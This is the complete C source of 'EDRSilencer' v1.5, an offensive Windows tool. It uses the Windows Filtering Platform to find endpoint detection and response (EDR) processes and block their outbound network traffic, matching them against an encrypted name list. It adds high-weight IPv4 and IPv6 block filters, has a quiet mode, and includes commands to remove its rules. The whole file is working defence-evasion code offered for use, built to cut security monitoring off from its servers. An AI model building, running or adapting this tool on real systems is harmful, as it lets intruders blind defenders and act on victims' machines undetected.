#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

#include <winsock2.h>
#include <windows.h>
#include <fwpmu.h> // For Windows Filtering Platform

#include "utils.h"
#include "process.h"

// Globally unique identifiers (GUIDs) for our WFP provider and sublayer
const GUID ProviderGUID = { 0x4e27e7d4, 0x2442, 0x4891, { 0x91, 0x2e, 0x42, 0x5, 0x42, 0x8a, 0x85, 0x55 } };
const GUID SubLayerGUID = { 0x4e27e7d5, 0x2442, 0x4891, { 0x91, 0x2e, 0x42, 0x5, 0x42, 0x8a, 0x85, 0x55 } };
wchar_t ruleDescription[] = L"Blocks outbound connections for a specific EDR process";




// Helper function to apply a simple, effective block filter for a given AppID.
void applyStealthFilters(HANDLE hEngine, const GUID* subLayerGuid, PCWSTR fullPath) {
    FWP_BYTE_BLOB* appId = NULL;
    DWORD result = 0;
    UINT64 filterId = 0;

    // Attempt to get the Application ID from the full path.
    if (CustomFwpmGetAppIdFromFileName0(fullPath, &appId) != CUSTOM_SUCCESS) {
        EWPRINTF(L"    [-] Failed to get AppID for %s\n", fullPath);
        return;
    }

    // --- Create a generic BLOCK filter structure ---
    FWPM_FILTER0 blockFilter = {0};
    blockFilter.subLayerKey = *subLayerGuid;
    blockFilter.action.type = FWP_ACTION_BLOCK; // The action is to BLOCK
    blockFilter.weight.type = FWP_UINT8;
    blockFilter.weight.uint8 = 15; // High weight to ensure it takes precedence
    blockFilter.numFilterConditions = 1;
    blockFilter.displayData.name = L"EDRSilencer Block Rule";
    blockFilter.displayData.description = ruleDescription;

    // Define the single condition: match the Application ID
    FWPM_FILTER_CONDITION0 blockCondition = {0};
    blockCondition.fieldKey = FWPM_CONDITION_ALE_APP_ID;
    blockCondition.matchType = FWP_MATCH_EQUAL;
    blockCondition.conditionValue.type = FWP_BYTE_BLOB_TYPE;
    blockCondition.conditionValue.byteBlob = appId;
    blockFilter.filterCondition = &blockCondition;

    // --- Add the filter for IPv4 ---
    blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
    result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, &filterId);
    if (result != ERROR_SUCCESS) {
        EWPRINTF(L"    [-] Failed to add IPv4 block filter for %s. Error: 0x%lX\n", fullPath, result);
    } else {
        WPRINTF(L"    [+] Block filter added for %s (ID: %llu, IPv4).\n", fullPath, filterId);
    }

    // --- Add the same filter for IPv6 ---
    blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
    filterId = 0; // Reset for the next call
    result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, &filterId);
    if (result != ERROR_SUCCESS) {
        EWPRINTF(L"    [-] Failed to add IPv6 block filter for %s. Error: 0x%lX\n", fullPath, result);
    } else {
        WPRINTF(L"    [+] Block filter added for %s (ID: %llu, IPv6).\n", fullPath, filterId);
    }

    // Clean up the AppID we created
    FreeAppId(appId);
}

// Helper function to initialize WFP engine and add provider/sublayer
BOOL initializeWfp(HANDLE* hEngine) {
    DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, hEngine);
    if (result != ERROR_SUCCESS) {
        EPRINTF("[-] FwpmEngineOpen0 failed. Error: 0x%lX\n", result);
        return FALSE;
    }

    FWPM_PROVIDER0 provider = { 0 };
    provider.providerKey = ProviderGUID;
    provider.displayData.name = EDR_PROVIDER_NAME;
    provider.displayData.description = EDR_PROVIDER_DESCRIPTION;
    result = FwpmProviderAdd0(*hEngine, &provider, NULL);
    if (result != ERROR_SUCCESS && (long)result != FWP_E_ALREADY_EXISTS) {
        EPRINTF("[-] FwpmProviderAdd0 failed. Error: 0x%lX\n", result);
        FwpmEngineClose0(*hEngine);
        return FALSE;
    }

    FWPM_SUBLAYER0 subLayer = { 0 };
    subLayer.subLayerKey = SubLayerGUID;
    subLayer.displayData.name = EDR_SUBLAYER_NAME;
    subLayer.displayData.description = EDR_SUBLAYER_DESCRIPTION;
    subLayer.providerKey = (GUID*)&ProviderGUID;
    subLayer.weight = 0x01;
    result = FwpmSubLayerAdd0(*hEngine, &subLayer, NULL);
    if (result != ERROR_SUCCESS && (long)result != FWP_E_ALREADY_EXISTS) {
        EPRINTF("[-] FwpmSubLayerAdd0 failed. Error: 0x%lX\n", result);
        FwpmEngineClose0(*hEngine);
        return FALSE;
    }

    return TRUE;
}

// Helper function to close the WFP engine handle
void shutdownWfp(HANDLE hEngine) {
    if (hEngine) {
        FwpmEngineClose0(hEngine);
        PRINTF("[+] WFP engine handle closed.\n");
    }
}

void addProcessRule(const char* processPath) {
    if (!EnableSeDebugPrivilege()) {
        EPRINTF("[-] Failed to enable SeDebugPrivilege. This is required to add a process rule.\n");
        return;
    }
    HANDLE hEngine = NULL;
    if (!initializeWfp(&hEngine)) {
        return;
    }

    wchar_t processPathW[MAX_PATH];
    errno_t err = mbstowcs_s(NULL, processPathW, MAX_PATH, processPath, _TRUNCATE);
    if (err != 0) {
        EPRINTF("[-] Failed to convert process path or path is too long.\n");
        shutdownWfp(hEngine);
        return;
    }

    // Directly call the filter function. It will handle AppID creation and logging.
    applyStealthFilters(hEngine, &SubLayerGUID, processPathW);

    shutdownWfp(hEngine);
}

// Function to configure network filters
void configureNetworkFilters() {
    if (!EnableSeDebugPrivilege()) {
        EPRINTF("[-] Failed to enable SeDebugPrivilege. This is required to access process information.\n");
        return; // Exit if we can't get the privilege
    }
    HANDLE hEngine = NULL;
    if (!initializeWfp(&hEngine)) {
        return;
    }

    WCHAR processedPaths[100][MAX_PATH] = {0}; // Track up to 100 unique paths
    int processedCount = 0;

    char** decryptedNames = (char**)malloc(PROCESS_DATA_COUNT * sizeof(char*));
    if (!decryptedNames) {
        EPRINTF("Memory allocation failed for decrypted names list.\n");
        shutdownWfp(hEngine);
        return;
    }

    for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
        decryptedNames[i] = decryptString(processData[i]);
    }

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        EPRINTF("[-] Failed to create snapshot of processes.\n");
        // Cleanup allocated memory before returning
        for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
            free(decryptedNames[i]);
        }
        free(decryptedNames);
        shutdownWfp(hEngine);
        return;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe32)) {
        do {
            for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
                if (decryptedNames[i] && _stricmp(pe32.szExeFile, decryptedNames[i]) == 0) {
                    PRINTF("[+] Found EDR process: %s\n", pe32.szExeFile);
                    WCHAR fullPath[MAX_PATH];
                    if (getProcessFullPath(pe32.th32ProcessID, fullPath, MAX_PATH)) {
                        BOOL alreadyProcessed = FALSE;
                        for (int i = 0; i < processedCount; ++i) {
                            if (_wcsicmp(processedPaths[i], fullPath) == 0) {
                                alreadyProcessed = TRUE;
                                break;
                            }
                        }

                        if (!alreadyProcessed) {
                            applyStealthFilters(hEngine, &SubLayerGUID, fullPath);
                            if (processedCount < 100) {
                                wcscpy_s(processedPaths[processedCount], MAX_PATH, fullPath);
                                processedCount++;
                            }
                        } else {
                            WPRINTF(L"    [!] Skipping already blocked process path: %s\n", fullPath);
                        }
                    } else {
                        // Optional: Add a log if getting the path fails for a matched process
                        EPRINTF("    [-] Could not get full path for process: %s\n", pe32.szExeFile);
                    }
                } else {
                    // Optional: Add a log if getting the path fails for a matched process
                    EPRINTF("    [-] Could not get full path for process: %s\n", pe32.szExeFile);
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    shutdownWfp(hEngine);
}

// Function to remove all rules
void removeAllRules() {
    if (!EnableSeDebugPrivilege()) {
        EPRINTF("[-] Failed to enable SeDebugPrivilege. This is required to remove rules.\n");
        return;
    }
    HANDLE hEngine = NULL;
    DWORD result = 0;

    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        EPRINTF("[-] FwpmEngineOpen0 failed. Error: 0x%lX\n", result);
        return;
    }

    // By deleting the sublayer, all filters within that sublayer are automatically removed.
    result = FwpmSubLayerDeleteByKey0(hEngine, &SubLayerGUID);
    if (result == ERROR_SUCCESS) {
        PRINTF("[+] Sublayer and all associated filters removed successfully.\n");
        } else if ((long)result == FWP_E_SUBLAYER_NOT_FOUND) {
        EPRINTF("[-] Sublayer not found. No rules to remove.\n");
    } else {
        EPRINTF("[-] FwpmSubLayerDeleteByKey0 failed. Error: 0x%lX\n", result);
    }

    // After removing the sublayer, we can remove the provider.
    result = FwpmProviderDeleteByKey0(hEngine, &ProviderGUID);
    if (result == ERROR_SUCCESS) {
        PRINTF("[+] Provider removed successfully.\n");
        } else if ((long)result == FWP_E_PROVIDER_NOT_FOUND) {
        EPRINTF("[-] Provider not found.\n");
    } else {
        EPRINTF("[-] FwpmProviderDeleteByKey0 failed. Error: 0x%lX\n", result);
    }

    FwpmEngineClose0(hEngine);
}

// Function to remove a rule by ID
void removeRuleById(UINT64 ruleId) {
    HANDLE hEngine = NULL;
    DWORD result = 0;

    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        EPRINTF("[-] FwpmEngineOpen0 failed. Error: 0x%lX\n", result);
        return;
    }

    result = FwpmFilterDeleteById0(hEngine, ruleId);
    if (result == ERROR_SUCCESS) {
        PRINTF("[+] Rule with ID %llu removed successfully.\n", ruleId);
        } else if ((long)result == FWP_E_FILTER_NOT_FOUND) {
        EPRINTF("[-] Rule with ID %llu not found.\n", ruleId);
    } else {
        EPRINTF("[-] Failed to remove rule with ID %llu. Error: 0x%lX\n", ruleId, result);
    }

    FwpmEngineClose0(hEngine);
}

void showHelp() {
    PRINTF("Usage: EDRSilencer.exe [--quiet | -q] <command>\n");
    PRINTF("Version: 1.5\n\n");
    PRINTF("Commands:\n");
     PRINTF("  blockedr    - Add network rules to block traffic of all detected target processes.\n");
    PRINTF("  add <path>  - Add a network rule to block traffic for a specific process.\n");
    PRINTF("                Example: EDRSilencer.exe add \"C:\\Windows\\System32\\curl.exe\"\n");
    PRINTF("  removeall   - Remove all network rules applied by this tool.\n");
    PRINTF("  remove <id> - Remove a specific network rule by its ID.\n");
    PRINTF("\nOptions:\n");
    PRINTF("  -q, --quiet - Suppress all console output.\n");
}

int main(int argc, char *argv[]) {
    // Parse for --quiet or -q flag before processing other commands
    for (int i = 1; i < argc; i++) {
        if (_stricmp(argv[i], "--quiet") == 0 || _stricmp(argv[i], "-q") == 0) {
            g_isQuiet = TRUE;
            // Shift remaining arguments to remove the quiet flag from the list
            for (int j = i; j < argc - 1; j++) {
                argv[j] = argv[j + 1];
            }
            argc--;
            i--; // Re-evaluate the current index
        }
    }
    if (argc < 2) {
        showHelp();
        return EXIT_FAILURE_ARGS;
    }

    if (_stricmp(argv[1], "-h") == 0 || _stricmp(argv[1], "--help") == 0) {
        showHelp();
        return EXIT_SUCCESS;
    }
    
    if (!CheckProcessIntegrityLevel()) {
        return EXIT_FAILURE_PRIVS;
    }

    if (_stricmp(argv[1], "blockedr") == 0) {
        configureNetworkFilters();
        } else if (_stricmp(argv[1], "add") == 0) {
        if (argc < 3) {
            EPRINTF("[-] Missing argument. Please provide the full path of the process.\n");
            return EXIT_FAILURE_ARGS;
        }
        addProcessRule(argv[2]);
        } else if (_stricmp(argv[1], "removeall") == 0) {
        removeAllRules();
        } else if (_stricmp(argv[1], "remove") == 0) {
        if (argc < 3) {
            EPRINTF("[-] Missing argument. Please provide the rule ID.\n");
            return EXIT_FAILURE_ARGS;
        }
        char *endptr;
        errno = 0;
        UINT64 ruleId = strtoull(argv[2], &endptr, 10);
        if (errno != 0 || endptr == argv[2]) {
            EPRINTF("[-] Invalid rule ID provided.\n");
            return EXIT_FAILURE_ARGS;
        }
        removeRuleById(ruleId);
    } else {
        EPRINTF("[-] Invalid command: \"%s\". Use -h for help.\n", argv[1]);
        return EXIT_FAILURE_ARGS;
    }
    return EXIT_SUCCESS;
}